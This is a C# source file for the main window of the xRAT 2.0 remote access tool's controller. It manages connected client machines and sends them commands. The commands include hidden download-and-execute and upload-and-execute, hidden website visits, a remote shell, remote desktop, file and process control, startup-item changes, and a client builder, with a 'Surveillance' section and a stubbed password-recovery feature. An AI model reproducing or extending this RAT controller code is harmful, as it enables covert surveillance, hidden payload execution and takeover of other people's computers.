using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Commands;
using xServer.Core.Helper;
using xServer.Core.Misc;
using xServer.Core.Packets;
using xServer.Core.Packets.ClientPackets;
using xServer.Core.Packets.ServerPackets;
using xServer.Settings;
using DownloadAndExecute = xServer.Core.Packets.ServerPackets.DownloadAndExecute;
using Update = xServer.Core.Packets.ServerPackets.Update;
using UploadAndExecute = xServer.Core.Packets.ServerPackets.UploadAndExecute;
using VisitWebsite = xServer.Core.Packets.ServerPackets.VisitWebsite;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public static volatile FrmMain Instance;
        private readonly ListViewColumnSorter _lvwColumnSorter;
        public Server ListenServer;

        public FrmMain()
        {
            Instance = this;

            ReadSettings();
            ShowTermsOfService(XMLSettings.ShowToU);

            InitializeComponent();

            Menu = mainMenu;

            _lvwColumnSorter = new ListViewColumnSorter();
            lstClients.ListViewItemSorter = _lvwColumnSorter;

            ListViewExtensions.removeDots(lstClients);
            ListViewExtensions.changeTheme(lstClients);
        }

        private void ReadSettings(bool writeIfNotExist = true)
        {
            if (writeIfNotExist)
                XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.ShowToU = bool.Parse(XMLSettings.ReadValue("ShowToU"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.UseUPnP = bool.Parse(XMLSettings.ReadValue("UseUPnP"));
            XMLSettings.Password = XMLSettings.ReadValue("Password");
        }

        private void ShowTermsOfService(bool show)
        {
            if (show)
            {
                using (var frm = new FrmTermsOfUse())
                {
                    frm.ShowDialog();
                }
                Thread.Sleep(300);
            }
        }

        public void UpdateWindowTitle(int count, int selected)
        {
            try
            {
                Invoke((MethodInvoker) delegate
                {
#if DEBUG
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count,
                            selected, Process.GetCurrentProcess().Threads.Count);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count,
                            Process.GetCurrentProcess().Threads.Count);
#else
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0}", count);
#endif
                });
            }
            catch
            {
            }
        }

        private void InitializeServer()
        {
            ListenServer = new Server();

            ListenServer.AddTypesToSerializer(typeof (IPacket), typeof (InitializeCommand), typeof (Disconnect),
                typeof (Reconnect), typeof (Uninstall), typeof (DownloadAndExecute), typeof (UploadAndExecute),
                typeof (Desktop), typeof (GetProcesses), typeof (KillProcess), typeof (StartProcess), typeof (Drives),
                typeof (Directory), typeof (DownloadFile), typeof (MouseClick), typeof (GetSystemInfo),
                typeof (VisitWebsite), typeof (ShowMessageBox), typeof (Update), typeof (Monitors),
                typeof (ShellCommand), typeof (Rename), typeof (Delete), typeof (Action), typeof (GetStartupItems),
                typeof (AddStartupItem), typeof (DownloadFileCanceled), typeof (Initialize), typeof (Status),
                typeof (UserStatus), typeof (DesktopResponse), typeof (GetProcessesResponse), typeof (DrivesResponse),
                typeof (DirectoryResponse), typeof (DownloadFileResponse), typeof (GetSystemInfoResponse),
                typeof (MonitorsResponse), typeof (ShellCommandResponse), typeof (GetStartupItemsResponse));

            ListenServer.ServerState += ServerState;
            ListenServer.ClientState += ClientState;
            ListenServer.ClientRead += ClientRead;
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();

            if (XMLSettings.AutoListen)
            {
                if (XMLSettings.UseUPnP)
                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                ListenServer.Listen(XMLSettings.ListenPort);
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ListenServer.Listening)
                ListenServer.Disconnect();

            if (XMLSettings.UseUPnP)
                UPnP.RemovePort(ushort.Parse(XMLSettings.ListenPort.ToString()));

            nIcon.Visible = false;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle(ListenServer.ConnectedClients, lstClients.SelectedItems.Count);
        }

        private void ServerState(Server server, bool listening)
        {
            try
            {
                Invoke((MethodInvoker) delegate { botListen.Text = "Listening: " + listening; });
            }
            catch
            {
            }
        }

        private void ClientState(Server server, Client client, bool connected)
        {
            if (connected)
            {
                client.Value = new UserState();
                    // Initialize the UserState so we can store values in there if we need to.

                new InitializeCommand().Execute(client);
            }
            else
            {
                var selectedClients = 0;
                Invoke((MethodInvoker) delegate
                {
                    selectedClients = lstClients.SelectedItems.Count;
                    foreach (ListViewItem lvi in lstClients.Items)
                    {
                        if ((Client) lvi.Tag == client)
                        {
                            lvi.Remove();
                            server.ConnectedClients--;
                        }
                    }
                });
                UpdateWindowTitle(ListenServer.ConnectedClients, selectedClients);
            }
        }

        private void ClientRead(Server server, Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (!client.Value.IsAuthenticated)
            {
                if (type == typeof (Initialize))
                    CommandHandler.HandleInitialize(client, (Initialize) packet);
                else
                    return;
            }

            if (type == typeof (Status))
            {
                CommandHandler.HandleStatus(client, (Status) packet);
            }
            else if (type == typeof (UserStatus))
            {
                CommandHandler.HandleUserStatus(client, (UserStatus) packet);
            }
            else if (type == typeof (DesktopResponse))
            {
                CommandHandler.HandleRemoteDesktopResponse(client, (DesktopResponse) packet);
            }
            else if (type == typeof (GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client, (GetProcessesResponse) packet);
            }
            else if (type == typeof (DrivesResponse))
            {
                CommandHandler.HandleDrivesResponse(client, (DrivesResponse) packet);
            }
            else if (type == typeof (DirectoryResponse))
            {
                CommandHandler.HandleDirectoryResponse(client, (DirectoryResponse) packet);
            }
            else if (type == typeof (DownloadFileResponse))
            {
                CommandHandler.HandleDownloadFileResponse(client, (DownloadFileResponse) packet);
            }
            else if (type == typeof (GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client, (GetSystemInfoResponse) packet);
            }
            else if (type == typeof (MonitorsResponse))
            {
                CommandHandler.HandleMonitorsResponse(client, (MonitorsResponse) packet);
            }
            else if (type == typeof (ShellCommandResponse))
            {
                CommandHandler.HandleShellCommandResponse(client, (ShellCommandResponse) packet);
            }
            else if (type == typeof (GetStartupItemsResponse))
            {
                CommandHandler.HandleGetStartupItemsResponse(client, (GetStartupItemsResponse) packet);
            }
        }

        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstClients.Sort();
        }

        #region "NotifyIcon"

        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            WindowState = (WindowState == FormWindowState.Normal) ? FormWindowState.Minimized : FormWindowState.Normal;
            ShowInTaskbar = (WindowState == FormWindowState.Normal);
        }

        #endregion "NotifyIcon"

        #region "ContextMenu"

        #region "Connection"

        private void ctxtUpdate_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            var c = (Client) lvi.Tag;
                            new Update(Core.Misc.Update.DownloadURL).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtDisconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                var c = (Client) lvi.Tag;
                new Disconnect().Execute(c);
            }
        }

        private void ctxtReconnect_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstClients.SelectedItems)
            {
                var c = (Client) lvi.Tag;
                new Reconnect().Execute(c);
            }
        }

        private void ctxtUninstall_Click(object sender, EventArgs e)
        {
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    var c = (Client) lvi.Tag;
                    new Uninstall().Execute(c);
                }
            }
        }

        #endregion "Connection"

        #region "System"

        private void ctxtSystemInformation_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmSi != null)
                {
                    c.Value.FrmSi.Focus();
                    return;
                }
                var frmSI = new FrmSystemInformation(c);
                frmSI.Show();
            }
        }

        private void ctxtFileManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmFm != null)
                {
                    c.Value.FrmFm.Focus();
                    return;
                }
                var frmFM = new FrmFileManager(c);
                frmFM.Show();
            }
        }

        private void ctxtStartupManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmStm != null)
                {
                    c.Value.FrmStm.Focus();
                    return;
                }
                var frmStm = new FrmStartupManager(c);
                frmStm.Show();
            }
        }

        private void ctxtTaskManager_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                var frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void ctxtRemoteShell_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                var frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void ctxtShutdown_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    var c = (Client) lvi.Tag;
                    new Action(0).Execute(c);
                }
            }
        }

        private void ctxtRestart_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    var c = (Client) lvi.Tag;
                    new Action(1).Execute(c);
                }
            }
        }

        private void ctxtStandby_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    var c = (Client) lvi.Tag;
                    new Action(2).Execute(c);
                }
            }
        }

        #endregion "System"

        #region "Surveillance"

        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmRdp != null)
                {
                    c.Value.FrmRdp.Focus();
                    return;
                }
                var frmRDP = new FrmRemoteDesktop(c);
                frmRDP.Show();
            }
        }

        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                // TODO
            }
        }

        #endregion "Surveillance"

        #region "Miscellaneous"

        private void ctxtLocalFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            var c = (Client) lvi.Tag;
                            new UploadAndExecute(Core.Misc.UploadAndExecute.File, Core.Misc.UploadAndExecute.FileName,
                                Core.Misc.UploadAndExecute.RunHidden).Execute(c);
                            CommandHandler.HandleStatus(c, new Status("Uploading file..."));
                        }
                    }
                }
            }
        }

        private void ctxtWebFile_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            var c = (Client) lvi.Tag;
                            new DownloadAndExecute(Core.Misc.DownloadAndExecute.URL,
                                Core.Misc.DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            var c = (Client) lvi.Tag;
                            new VisitWebsite(Core.Misc.VisitWebsite.URL, Core.Misc.VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
        }

        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                var c = (Client) lstClients.SelectedItems[0].Tag;
                if (c.Value.FrmSm != null)
                {
                    c.Value.FrmSm.Focus();
                    return;
                }
                var frmSM = new FrmShowMessagebox(c);
                frmSM.Show();
            }
        }

        #endregion "Miscellaneous"

        #endregion "ContextMenu"

        #region "MenuStrip"

        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (ListenServer.BytesReceived == 0 || ListenServer.BytesSent == 0)
                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            else
            {
                using (
                    var frm = new FrmStatistics(ListenServer.BytesReceived, ListenServer.BytesSent,
                        ListenServer.ConnectedClients, ListenServer.AllTimeConnectedClients.Count))
                {
                    frm.ShowDialog();
                }
            }
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion "MenuStrip"
    }
}